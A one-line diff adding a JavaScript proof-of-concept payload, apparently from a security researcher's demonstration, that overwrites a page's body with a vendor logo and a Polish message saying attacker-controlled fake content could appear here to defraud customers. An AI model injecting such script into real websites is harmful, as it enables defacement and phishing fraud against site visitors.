@@ -1,0 +1,1 @@
+document.querySelector('body').innerHTML = "<img src=https://afine.com/wp-content/themes/afine/assets/img/logo.svg><h3>Tutaj może pojawić się fałszywa treść kontrolowana przez atakującego. Może ona służyć np. do wyłudzenia pieniędzy klienta.</h3>";
